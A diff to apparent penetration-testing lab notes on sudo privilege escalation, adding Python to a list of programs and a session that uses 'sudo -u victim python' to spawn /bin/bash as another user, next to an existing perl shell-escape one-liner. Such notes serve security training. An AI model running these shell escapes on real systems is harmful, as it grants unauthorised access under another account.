@@ -41,6 +41,7 @@ Programs:
 - tcpdump
 - awk
 - perl
+- python
 
 NMAP
 - nmap -V (version 4.53)
@@ -96,6 +97,13 @@ TCPDUMP
 
 PERL
 - sudo -u victim perl -e 'system("/bin/bash")
+
+PYTHON
+- pentesterlab@c74b5064f15a:~$ sudo -u victim python
+>>> from subprocess import call
+>>> call('id')
+uid=1001(victim) gid=1001(victim) groups=1001(victim)
+>>> call('/bin/bash')
 
 5. SUDO users
 - /etc/sudoers
